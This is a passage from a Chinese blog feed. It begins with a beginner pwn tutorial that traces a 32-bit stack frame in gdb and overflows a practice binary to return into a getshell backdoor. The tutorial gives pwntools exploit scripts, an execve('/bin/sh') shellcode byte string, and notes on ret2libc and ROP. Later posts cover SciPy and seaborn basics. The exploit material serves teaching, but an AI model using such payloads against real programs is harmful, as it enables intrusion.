<p>前一篇文章<a href="https://onecoderman.github.io/2019/10/30/docker-IDAPro/#more" target="_blank" rel="noopener">docker-IDAPro</a></p>
<h1 id="0x00-基础知识"><a href="#0x00-基础知识" class="headerlink" title="0x00 基础知识"></a>0x00 基础知识</h1><p>这是一个32位的程序。<code>x86</code>的通用寄存器是<code>eax</code>,<code>ebx</code>,<code>ecx</code>,<code>ebp</code>,<code>esp</code>,<code>esi</code>,<code>edi</code><br>x86体系调用过程见[4]</p>
<h2 id="call指令"><a href="#call指令" class="headerlink" title="call指令"></a>call指令</h2><p><code>call function</code>在<code>x86</code>下的功能</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">push IP  #保存返回地址</span><br><span class="line">mov IP, [function]  #修改IP</span><br></pre></td></tr></table></figure>

<h2 id="leave指令"><a href="#leave指令" class="headerlink" title="leave指令"></a>leave指令</h2><p><code>leave</code>指令是调整栈帧的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov esp, ebp #sp指向bp</span><br><span class="line">pop ebp   #返回原来的bp</span><br></pre></td></tr></table></figure>

<h2 id="ret指令"><a href="#ret指令" class="headerlink" title="ret指令"></a>ret指令</h2><p><code>x86</code>下是修改EIP用的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pop eip</span><br></pre></td></tr></table></figure>

<h1 id="0x01-函数调用过程分析"><a href="#0x01-函数调用过程分析" class="headerlink" title="0x01 函数调用过程分析"></a>0x01 函数调用过程分析</h1><p>将<code>hello</code>文件上传到linux系统，参考文献[3]。<br>下面是<code>hello</code>函数的伪代码<br><img src="/images/stack-overflow-eg/14.png" alt="pic"><br>在x86下函数调用是cdecl调用约定，参数从右到左以此压入栈。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdb hello</span><br><span class="line">(gdb) b main</span><br><span class="line">(gdb) start</span><br></pre></td></tr></table></figure>

<h2 id="call-hello前的情况"><a href="#call-hello前的情况" class="headerlink" title="call hello前的情况"></a>call hello前的情况</h2><p><img src="/images/stack-overflow-eg/01.png" alt="pic"><br>此时的栈情况如下所示<br><img src="/images/stack-overflow-eg/08.png" alt="pic"></p>
<h2 id="进入hello函数"><a href="#进入hello函数" class="headerlink" title="进入hello函数"></a>进入hello函数</h2><p><img src="/images/stack-overflow-eg/02.png" alt="pic"><br>调用<code>call</code>指令其实是<code>push IP  #保存返回地址</code>与<code>mov IP, [function]  #修改IP</code>两条指令<br>此时栈的情况如下所示<br><img src="/images/stack-overflow-eg/09.png" alt="pic"><br><br><br>可以看一下hello函数的代码<br><img src="/images/stack-overflow-eg/03.png" alt="pic"></p>
<h2 id="产生新的栈帧"><a href="#产生新的栈帧" class="headerlink" title="产生新的栈帧"></a>产生新的栈帧</h2><p><img src="/images/stack-overflow-eg/04.png" alt="pic"><br>通过函数的前两句指令，新的栈帧产生，此时栈的情况如下所示<br><img src="/images/stack-overflow-eg/10.png" alt="pic"><br>然后在栈帧中进行函数的功能操作，可以随着函数的执行，栈一直在生长(sp会减小)，停留下来看read函数的执行。</p>
<h2 id="read函数的情形"><a href="#read函数的情形" class="headerlink" title="read函数的情形"></a>read函数的情形</h2><p><img src="/images/stack-overflow-eg/05.png" alt="pic"><br>可以看到<code>read</code>执行的时候，读取的值保持在地址<code>0xffffd656</code>处。<br>栈一直生长，此时看到的栈如下所示<br><img src="/images/stack-overflow-eg/11.png" alt="pic"></p>
<h2 id="leave前，退出hello函数前的情况"><a href="#leave前，退出hello函数前的情况" class="headerlink" title="leave前，退出hello函数前的情况"></a>leave前，退出hello函数前的情况</h2><p><img src="/images/stack-overflow-eg/06.png" alt="pic"><br>hello函数主体功能已经完成，需要销毁栈帧，回退到调用之前的栈状态。<br>此时的栈情况如下<br><img src="/images/stack-overflow-eg/12.png" alt="pic"></p>
<h2 id="leave后"><a href="#leave后" class="headerlink" title="leave后"></a>leave后</h2><p>leave指令的作用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov esp, ebp #sp指向bp</span><br><span class="line">pop ebp   #返回原来的bp</span><br></pre></td></tr></table></figure>

<p><img src="/images/stack-overflow-eg/07.png" alt="pic"><br>此时栈的情况如下<br><img src="/images/stack-overflow-eg/13.png" alt="pic"><br>可以看到，此时的栈的bp已经回到了调用之前的栈底，栈顶元素就是返回地址。<br>然后执行<code>pop ip</code>修改IP位当前栈顶元素，从而实现程序跳转到原来的<code>main</code>函数。<br>然后可以进行出栈操作可以恢复现场，这些参数存储着原来的值。</p>
<h1 id="0x01-漏洞利用原理"><a href="#0x01-漏洞利用原理" class="headerlink" title="0x01 漏洞利用原理"></a>0x01 漏洞利用原理</h1><p>从read函数情形那里可以看出，输入的数据保存在地址<code>0xffffd656</code>处。而保存的返回IP地址在<code>0xffffd66c</code>,我们只要覆盖<code>0xffffd66c</code>处的值（这里是保存的IP值，修改之后便能跳转）。<br>两者的距离是<code>0xffffd66c</code>-<code>0xffffd656</code>=<code>0x16</code><br>所以输入<code>A</code>*0x16+一个地址就能达到覆盖返回地址的值，实现程序跳转。<br>这个程序在地址<code>0x0804846B</code>处有一个后门，是一个叫<code>getshell</code>的函数<br><img src="/images/stack-overflow-eg/15.png" alt="pic"></p>
<h1 id="0x02-pwntools与docker环境的复现"><a href="#0x02-pwntools与docker环境的复现" class="headerlink" title="0x02 pwntools与docker环境的复现"></a>0x02 pwntools与docker环境的复现</h1><ul>
<li><p>step1: 端口转发</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">socat tcp-listen:10001,reuseaddr,fork EXEC:./hello,pty,raw,echo=0</span><br></pre></td></tr></table></figure>
</li>
<li><p>step2: 本地主机上打开python<br>依次执行下面命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io=remote(&quot;172.17.0.2&quot;,10001)</span><br><span class="line">payload=22*&apos;A&apos;+p32(0x804846b)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
</li>
<li><p>step3: 获得shell<br>可以看到如下情况<br><img src="/images/stack-overflow-eg/16.png" alt="pic"></p>
</li>
</ul>
<h1 id="0x03-pwntools在本地主机复现"><a href="#0x03-pwntools在本地主机复现" class="headerlink" title="0x03 pwntools在本地主机复现"></a>0x03 pwntools在本地主机复现</h1><p>这里不通过端口转发，直接在本地环境上实验<br>在本地主机上写上如下脚本<code>exploit.py</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = process(&apos;./hello&apos;)</span><br><span class="line">payload = &apos;A&apos;*22+p32(0x0804846b)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>运行脚本<code>python exploit.py</code><br>可以看到如下情况<br><img src="/images/stack-overflow-eg/17.png" alt="pic"></p>
<h1 id="0x04-python输出十六进制字符"><a href="#0x04-python输出十六进制字符" class="headerlink" title="0x04 python输出十六进制字符"></a>0x04 python输出十六进制字符</h1><p>这里的python是值python2，python3会因为编码默认位utf-8编码，所以不会产生预期的结果，需要设置编码。</p>
<h2 id="输出十六进制字符"><a href="#输出十六进制字符" class="headerlink" title="输出十六进制字符"></a>输出十六进制字符</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -c &apos;print(22*&quot;A&quot;+&quot;\x6b\x84\x04\x08&quot;)&apos; &gt; text</span><br></pre></td></tr></table></figure>

<p><strong>注意，这种方式末尾有一个换行符</strong><br>因此，可以使用下面的<code>gen.py</code>生产我们的十六进字符，<code>f.write()</code>不会添加自动换行。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">f = open(&apos;text&apos;,&apos;w&apos;)</span><br><span class="line">s = &quot;\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span><br><span class="line">f.write(s)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>

<p>使用命令运行<code>python gen.py</code>就可以得到我们的text文件。<br>可以进行<code>(gdb) run &lt; text</code>调试</p>
<h2 id="以十六进制格式查看文件"><a href="#以十六进制格式查看文件" class="headerlink" title="以十六进制格式查看文件"></a>以十六进制格式查看文件</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from __future__ import print_function</span><br><span class="line">f = open(&apos;text&apos;,&apos;rb&apos;)</span><br><span class="line">n = 0;</span><br><span class="line">s = f.read(1)</span><br><span class="line">while s:</span><br><span class="line">        byte = ord(s)</span><br><span class="line">        n = n+1</span><br><span class="line">        print(&apos;0x%02x,&apos;%(byte),end=&apos;&apos;)</span><br><span class="line">        if n%16==0:</span><br><span class="line">                print(&apos;&apos;)</span><br><span class="line">        s = f.read(1)</span><br><span class="line">print(&apos;\n\ntotal bytes: %d&apos;%n)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>

<h1 id="0x05转发调试"><a href="#0x05转发调试" class="headerlink" title="0x05转发调试"></a>0x05转发调试</h1><p>这个是为了方便输入一些不可见字符，方便gdb调试。</p>
<ul>
<li>step1：将程序的IO端口利用socat进行转发</li>
<li>step2: 使用<code>gdb attach pid</code>进行附加调试</li>
<li>step3: 使用pwntools进行调试，同0x02。</li>
</ul>
<h1 id="0x06拓展-栈溢出利用的技巧"><a href="#0x06拓展-栈溢出利用的技巧" class="headerlink" title="0x06拓展_栈溢出利用的技巧"></a>0x06拓展_栈溢出利用的技巧</h1><p>我们主要的目标是覆盖返回地址，控制程序流程。这里的知识笔记来自于参考文献[6]。<br>一些常用的覆盖技术如下：<br>修改栈中的返回地址，指向栈中的一段数据指令（shellcode）<br>修改栈中的返回地址，指向内存中已有的某个函数（return2libc）<br>修改栈中的返回地址，其指向内存中已有的一段指令（ROP）<br>修改某个被调用函数的地址，其指向另一个函数（hijack GOT）</p>
<h2 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h2><p>前提：栈上的数据有执行权限。<br>这种利用方法的栈情况如下(图片来源于参考文献[6])，红色部分就是要构造的payload。<br><img src="/images/stack-overflow-eg/18.jpg" alt="pic18"><br>这里有两个关键的问题需要解决：</p>
<ul>
<li>Q1:覆盖到返回地址之前的padding1长度如何获知？<br>A1:使用gdb调试工具查看汇编代码获得，本文上面部分0x01；运行过程中输入不同的”AAA”进行试探；使用idaPro反汇编功能。</li>
<li>Q2：shellcode的起始地址如何确定？<br>A1:padding2填充若干的”\x90”(nop)，增大命中几率。</li>
</ul>
<h2 id="return2libc"><a href="#return2libc" class="headerlink" title="return2libc"></a>return2libc</h2><p>一个简单的示例是条用system()函数打开shell，system(“/bin/sh)。<br><img src="/images/stack-overflow-eg/19.jpg" alt="pic18"><br>padding2 处的数据长度为4（32位机），对应调用 system() 时的返回地址[6]。</p>
<h2 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h2><p>目标函数在内存内无法找到，在内存中寻找多个指令片段，拼凑出一系列操作来达成目的。<br>执行某段指令(称为“gadget”)。<br><img src="/images/stack-overflow-eg/20.jpg" alt="pic18"><br>上图是一个当个gadget数据的情况。<br>连续执行若干段指令，就需要每个 gadget 执行完毕可以将控制权交给下一个 gadget。[7]<br><img src="/images/stack-overflow-eg/21.jpg" alt="pic18"></p>
<blockquote>
<p>对于前置的docker环境搭建和调试代码，可参考文献[2]</p>
</blockquote>
<h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><p>[1] <a href="https://mp.weixin.qq.com/s/r4F_b5wUVluZkgLMHb574Q" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/r4F_b5wUVluZkgLMHb574Q</a><br>[2] <a href="https://rj45mp.github.io/2019/08/07/i春秋linux-pwn入门教程复现之栈溢出基础/" target="_blank" rel="noopener">https://rj45mp.github.io/2019/08/07/i春秋linux-pwn入门教程复现之栈溢出基础/</a><br>[3] <a href="https://pan.baidu.com/s/10nqi8s-hkjqIt4RTl869nw" target="_blank" rel="noopener">https://pan.baidu.com/s/10nqi8s-hkjqIt4RTl869nw</a>   环境和代码（porf）[key borad -1]<br>[4] <a href="https://rj45mp.github.io/2019/09/30/x86%E6%9E%B6%E6%9E%84%E4%B8%8Ex64%E6%9E%B6%E6%9E%84%E5%9C%A8%E5%87%BD%E6%95%B0%E4%BA%8E%E6%A0%88%E4%B8%AD%E8%B0%83%E7%94%A8%E8%BF%87%E7%A8%8B%E7%9A%84%E4%B8%8D%E5%90%8C%E4%B9%8B%E5%A4%84/?tdsourcetag=s_pctim_aiomsg" target="_blank" rel="noopener">https://rj45mp.github.io/2019/09/30/x86%E6%9E%B6%E6%9E%84%E4%B8%8Ex64%E6%9E%B6%E6%9E%84%E5%9C%A8%E5%87%BD%E6%95%B0%E4%BA%8E%E6%A0%88%E4%B8%AD%E8%B0%83%E7%94%A8%E8%BF%87%E7%A8%8B%E7%9A%84%E4%B8%8D%E5%90%8C%E4%B9%8B%E5%A4%84/?tdsourcetag=s_pctim_aiomsg</a><br>[5] <a href="https://blog.csdn.net/jctian000/article/details/85099980" target="_blank" rel="noopener">https://blog.csdn.net/jctian000/article/details/85099980</a> 读取十六进代码<br>[6] <a href="https://zhuanlan.zhihu.com/p/25816426" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/25816426</a><br>[7] <a href="https://zhuanlan.zhihu.com/p/25892385" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/25892385</a></p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>栈溢出</tag>
      </tags>
  </entry>
  <entry>
    <title>SciPy-basic</title>
    <url>/2019/11/03/SciPy-basic/</url>
    <content><![CDATA[<p>SciPy科学计算基础<br>用于数学、科学和工程的开源库，其集成了统计、优化、线性代数、傅立叶变换、信号和图像处理，ODE 求解器等模块<br><a href="https://www.scipy.org/docs.html" target="_blank" rel="noopener">官网</a></p>
<a id="more"></a>

<h1 id="0x00-常量模块"><a href="#0x00-常量模块" class="headerlink" title="0x00 常量模块"></a>0x00 常量模块</h1><p>需要导入包<code>from scipy import constants</code><br><a href="https://docs.scipy.org/doc/scipy/reference/constants.html" target="_blank" rel="noopener">官方文档</a></p>
<h2 id="pi"><a href="#pi" class="headerlink" title="pi"></a>pi</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">p=constants.pi</span><br><span class="line">print(p)</span><br><span class="line"># 结果：3.141592653589793</span><br></pre></td></tr></table></figure>

<h2 id="光速"><a href="#光速" class="headerlink" title="光速"></a>光速</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">constants.c, constants.speed_of_light  # 两种写法</span><br></pre></td></tr></table></figure>

<h1 id="0x01-线性代数模块"><a href="#0x01-线性代数模块" class="headerlink" title="0x01 线性代数模块"></a>0x01 线性代数模块</h1><p>需要导入包<code>from scipy import linalg</code><br><a href="https://docs.scipy.org/doc/scipy/reference/linalg.html" target="_blank" rel="noopener">官方文档</a></p>
<h2 id="求矩阵的逆"><a href="#求矩阵的逆" class="headerlink" title="求矩阵的逆"></a>求矩阵的逆</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">m=np.matrix([[1, 2], [3, 4]])</span><br><span class="line">print(m)</span><br><span class="line">rev=linalg.inv(m)</span><br><span class="line">print(rev)</span><br></pre></td></tr></table></figure>

<p><img src="/images/SciPy-basic/01.png" alt="pic"></p>
<h1 id="0x02-差值模块"><a href="#0x02-差值模块" class="headerlink" title="0x02 差值模块"></a>0x02 差值模块</h1><p><a href="https://docs.scipy.org/doc/scipy/reference/interpolate.html" target="_blank" rel="noopener">官方文档</a><br>插值，是数值分析领域中通过已知的、离散的数据点，在范围内推求新数据点的过程或方法。<br>需要导入的模块<code>from scipy import interpolate</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">x = np.array([0, 1, 2, 3, 4, 5, 6, 7, 8, 9])</span><br><span class="line">y = np.array([0, 1, 4, 9, 16, 25, 36, 49, 64, 81])</span><br><span class="line">plt.scatter(x, y)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>

<p><img src="/images/SciPy-basic/02.png" alt="pic"></p>
<p>进行插值如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">x = np.array([0, 1, 2, 3, 4, 5, 6, 7, 8, 9])</span><br><span class="line">y = np.array([0, 1, 4, 9, 16, 25, 36, 49, 64, 81])</span><br><span class="line"></span><br><span class="line">xx = np.array([0.5, 1.5, 2.5, 3.5, 4.5, 5.5, 6.5, 7.5, 8.5])  # 两点之间的点的 x 坐标</span><br><span class="line">f = interpolate.interp1d(x, y)  # 使用原样本点建立插值函数</span><br><span class="line">yy = f(xx)  # 映射到新样本点</span><br><span class="line"></span><br><span class="line">plt.scatter(x, y)</span><br><span class="line">plt.scatter(xx, yy, marker=&apos;*&apos;)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>

<p><img src="/images/SciPy-basic/03.png" alt="pic"></p>
<h1 id="0x03-图像处理模块"><a href="#0x03-图像处理模块" class="headerlink" title="0x03 图像处理模块"></a>0x03 图像处理模块</h1><p>SciPy 集成了大量针对图像处理的函数和方法，即对多维数组的处理过程，可以完成卷积、滤波，转换等一系列操作。<br><a href="https://docs.scipy.org/doc/scipy/reference/ndimage.html" target="_blank" rel="noopener">官方文档</a><br>需要导入的包<code>from scipy import ndimage</code></p>
<p>先导入一张浣熊图片</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from scipy import misc</span><br><span class="line">face = misc.face()</span><br><span class="line">print(type(face))</span><br><span class="line">print(face.shape)</span><br></pre></td></tr></table></figure>

<p>可以看到是一个RGB三维数组<br><img src="/images/SciPy-basic/04.png" alt="pic"><br>可以使用如下命令进行可视化还原</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">face = misc.face()</span><br><span class="line">plt.imshow(face)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>

<p><img src="/images/SciPy-basic/05.png" alt="pic"></p>
<h2 id="高斯模糊处理"><a href="#高斯模糊处理" class="headerlink" title="高斯模糊处理"></a>高斯模糊处理</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from scipy import misc</span><br><span class="line">from scipy import ndimage</span><br><span class="line">face = misc.face()</span><br><span class="line">plt.imshow(ndimage.gaussian_filter(face, sigma=5))</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>

<p><img src="/images/SciPy-basic/06.png" alt="pic"></p>
<h2 id="旋转变换"><a href="#旋转变换" class="headerlink" title="旋转变换"></a>旋转变换</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">face = misc.face()</span><br><span class="line">plt.imshow(ndimage.rotate(face, 45))</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>

<p><img src="/images/SciPy-basic/07.png" alt="pic"></p>
<h2 id="卷积操作"><a href="#卷积操作" class="headerlink" title="卷积操作"></a>卷积操作</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">face = misc.face()</span><br><span class="line">k = np.random.randn(2, 2, 3)  # 卷积核</span><br><span class="line">plt.imshow(ndimage.convolve(face, k))</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>

<p><img src="/images/SciPy-basic/08.png" alt="pic"></p>
<h1 id="0x04-线性回归"><a href="#0x04-线性回归" class="headerlink" title="0x04 线性回归"></a>0x04 线性回归</h1><p>给定x和y值。然后假设其符合<code>y = ax^2 + by</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">x = np.array([1, 2.5, 3.5, 4, 5, 7, 8.5])</span><br><span class="line">y = np.array([0.3, 1.1, 1.5, 2.0, 3.2, 6.6, 8.6])</span><br><span class="line">M = x[:, np.newaxis]**[0,2] # 我们完成 x^2计算，并添加截距项系数 1</span><br><span class="line">print(M)</span><br><span class="line">p = linalg.lstsq(M, y)[0] #最小二乘法计算，返回的第一组参数即为拟合系数</span><br><span class="line">print(p)</span><br><span class="line">plt.scatter(x, y)</span><br><span class="line">xx = np.linspace(0, 10, 100)</span><br><span class="line">yy = p[0] + p[1]*xx**2</span><br><span class="line">plt.plot(xx, yy)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>

<p><img src="/images/SciPy-basic/09.png" alt="pic"><img src="/images/SciPy-basic/10.png" alt="pic"></p>
<h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><p>[1] <a href="https://www.shiyanlou.com/courses/1347/learning/?id=11330" target="_blank" rel="noopener">https://www.shiyanlou.com/courses/1347/learning/?id=11330</a><br>[2] <a href="https://docs.scipy.org/doc/scipy/reference/" target="_blank" rel="noopener">https://docs.scipy.org/doc/scipy/reference/</a></p>
]]></content>
      <categories>
        <category>Numpy</category>
      </categories>
      <tags>
        <tag>Numpy</tag>
        <tag>SciPy</tag>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>seaborn-basic</title>
    <url>/2019/11/02/seaborn-basic/</url>
    <content><![CDATA[<p>Seaborn基本知识<br>Seaborn 对Matplotlib核心库封装，可以轻松地画出更美的图形，非常适合数据分析的可视化。<a href="https://seaborn.pydata.org/api.html" target="_blank" rel="noopener">官方文档</a></p>
<a id="more"></a>
<p>需要导入包<code>import seaborn as sns</code></p>
<h1 id="0x00-快速优化"><a href="#0x00-快速优化" class="headerlink" title="0x00 快速优化"></a>0x00 快速优化</h1><p>使用Matplotlib画的图形如下<br><img src="/images/seaborn-basic/01.png" alt="pic"><br>使用Seaborn进行快速优化</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sns.set()  # 声明使用 Seaborn 样式</span><br><span class="line">x = [1, 3, 5, 7, 9, 11, 13, 15, 17, 19]</span><br><span class="line">y_bar = [3, 4, 6, 8, 9, 10, 9, 11, 7, 8]</span><br><span class="line">y_line = [2, 3, 5, 7, 8, 9, 8, 10, 6, 7]</span><br><span class="line"></span><br><span class="line">plt.bar(x, y_bar)</span><br><span class="line">plt.plot(x, y_line, &apos;-o&apos;, color=&apos;y&apos;)</span><br><span class="line">plt.show();</span><br></pre></td></tr></table></figure>

<p><img src="/images/seaborn-basic/02.png" alt="pic"></p>
<p><code>sns.set()</code>的格式如下，给出了默认参数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sns.set(context=&apos;notebook&apos;, style=&apos;darkgrid&apos;, palette=&apos;deep&apos;, font=&apos;sans-serif&apos;, font_scale=1, color_codes=False, rc=None)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>说明<br>context—-控制画幅大小—–{paper, notebook, talk, poster}<br>style——控制样式———{darkgrid, whitegrid, dark, white, ticks}<br>palette—-调色板———-{deep, muted, bright, pastel, dark, colorblind}</p>
</blockquote>
<h1 id="0x01-实验数据准备"><a href="#0x01-实验数据准备" class="headerlink" title="0x01 实验数据准备"></a>0x01 实验数据准备</h1><p><a href="https://archive.ics.uci.edu/ml/datasets/iris" target="_blank" rel="noopener">dataSet</a><br>数据集总共 150 行，由 5 列组成。分别代表：萼片长度、萼片宽度、花瓣长度、花瓣宽度、花的类别。其中，前四列均为数值型数据，最后一列花的分类为三种，分别是：Iris Setosa、Iris Versicolour、Iris Virginica</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 这个是在线的数据集，估计是seaborn内置的数据</span><br><span class="line">iris = sns.load_dataset(&quot;iris&quot;)</span><br><span class="line">print(iris.head())</span><br></pre></td></tr></table></figure>

<p><img src="/images/seaborn-basic/03.png" alt="pic"></p>
<h1 id="0x02-关联图"><a href="#0x02-关联图" class="headerlink" title="0x02 关联图"></a>0x02 关联图</h1><p>关联图主要是线性图，散点图,涉及三个API</p>
<table>
<tr><td>名称</td><td>功能</td><td>备注</td></tr>
<tr><td>relplot</td><td>绘制关系图</td><td>Figure-level 接口</td></tr>
<tr><td>scatterplot</td><td>多维度分析散点图</td><td>Axes-level </td></tr>
<tr><td>scatterplot</td><td>多维度分析线形图</td><td>Axes-level </td></tr>
</table>

<blockquote>
<p>Axes-level接口与Matplotlib紧密的更好。Figure-level适合快速上手。Figure-level接口可以实现Axes-level接口的功能，见0x02_01</p>
</blockquote>
<h2 id="0x02-00-散点图"><a href="#0x02-00-散点图" class="headerlink" title="0x02_00 散点图"></a>0x02_00 散点图</h2><p>指定x，y为萼片长度和萼片宽度</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">iris = sns.load_dataset(&quot;iris&quot;)</span><br><span class="line">sns.relplot(x=&quot;sepal_length&quot;, y=&quot;sepal_width&quot;, data=iris)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>

<p><img src="/images/seaborn-basic/04.png" alt="pic"><br><strong>可以优化，加入类别特征</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">iris = sns.load_dataset(&quot;iris&quot;)</span><br><span class="line">sns.relplot(x=&quot;sepal_length&quot;, y=&quot;sepal_width&quot;, hue=&quot;species&quot;, data=iris)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>

<p><img src="/images/seaborn-basic/05.png" alt="pic"></p>
<p><strong>继续优化，不同类别不同形状</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">iris = sns.load_dataset(&quot;iris&quot;)</span><br><span class="line">sns.relplot(x=&quot;sepal_length&quot;, y=&quot;sepal_width&quot;,</span><br><span class="line">            hue=&quot;species&quot;, style=&quot;species&quot;, data=iris)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>

<p><img src="/images/seaborn-basic/06.png" alt="pic"></p>
<h2 id="0x02-01-线性图"><a href="#0x02-01-线性图" class="headerlink" title="0x02_01 线性图"></a>0x02_01 线性图</h2><p>线形态绘制时还会自动给出95%的置信区间。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">iris = sns.load_dataset(&quot;iris&quot;)</span><br><span class="line">sns.lineplot(x=&quot;sepal_length&quot;, y=&quot;petal_length&quot;,</span><br><span class="line">             hue=&quot;species&quot;, style=&quot;species&quot;, data=iris)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>

<p>这个可以用<code>relplot</code>实现</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sns.relplot(x=&quot;sepal_length&quot;, y=&quot;petal_length&quot;,</span><br><span class="line">            hue=&quot;species&quot;, style=&quot;species&quot;, kind=&quot;line&quot;, data=iris)</span><br></pre></td></tr></table></figure>

<p><img src="/images/seaborn-basic/07.png" alt="pic"></p>
<h1 id="0x03-类别图"><a href="#0x03-类别图" class="headerlink" title="0x03 类别图"></a>0x03 类别图</h1><p>类别图的<code>Figure-level</code>接口是<code>catplot</code>。是一些<code>Axes-level</code>的集合。<br>下面列出Axes-level接口</p>
<ul>
<li>分类散点图<blockquote>
<p>stripplot() (kind=”strip”)<br>swarmplot() (kind=”swarm”)</p>
</blockquote>
</li>
<li>分类分布图<blockquote>
<p>boxplot() (kind=”box”)<br>violinplot() (kind=”violin”)<br>boxenplot() (kind=”boxen”)</p>
</blockquote>
</li>
<li>分类估计图<blockquote>
<p>pointplot() (kind=”point”)<br>barplot() (kind=”bar”)<br>countplot() (kind=”count”)</p>
</blockquote>
</li>
</ul>
<h2 id="分类散点图"><a href="#分类散点图" class="headerlink" title="分类散点图"></a>分类散点图</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">iris = sns.load_dataset(&quot;iris&quot;)</span><br><span class="line">sns.catplot(x=&quot;sepal_length&quot;, y=&quot;species&quot;, data=iris)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>

<p><img src="/images/seaborn-basic/08.png" alt="pic"><br>可以设置防止点重叠</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">iris = sns.load_dataset(&quot;iris&quot;)</span><br><span class="line">sns.catplot(x=&quot;sepal_length&quot;, y=&quot;species&quot;, kind=&quot;swarm&quot;, data=iris)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>

<p><img src="/images/seaborn-basic/09.png" alt="pic"></p>
<h2 id="分类分布图"><a href="#分类分布图" class="headerlink" title="分类分布图"></a>分类分布图</h2><h3 id="箱线图"><a href="#箱线图" class="headerlink" title="箱线图"></a>箱线图</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">iris = sns.load_dataset(&quot;iris&quot;)</span><br><span class="line">sns.catplot(x=&quot;sepal_length&quot;, y=&quot;species&quot;, kind=&quot;box&quot;, data=iris)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>

<p><img src="/images/seaborn-basic/10.png" alt="pic"></p>
<h3 id="小提琴图"><a href="#小提琴图" class="headerlink" title="小提琴图"></a>小提琴图</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">iris = sns.load_dataset(&quot;iris&quot;)</span><br><span class="line">sns.catplot(x=&quot;sepal_length&quot;, y=&quot;species&quot;, kind=&quot;violin&quot;, data=iris)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>

<p><img src="/images/seaborn-basic/11.png" alt="pic"></p>
<h3 id="增强箱线图"><a href="#增强箱线图" class="headerlink" title="增强箱线图"></a>增强箱线图</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">iris = sns.load_dataset(&quot;iris&quot;)</span><br><span class="line">sns.catplot(x=&quot;species&quot;, y=&quot;sepal_length&quot;, kind=&quot;boxen&quot;, data=iris)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>

<p><img src="/images/seaborn-basic/12.png" alt="pic"></p>
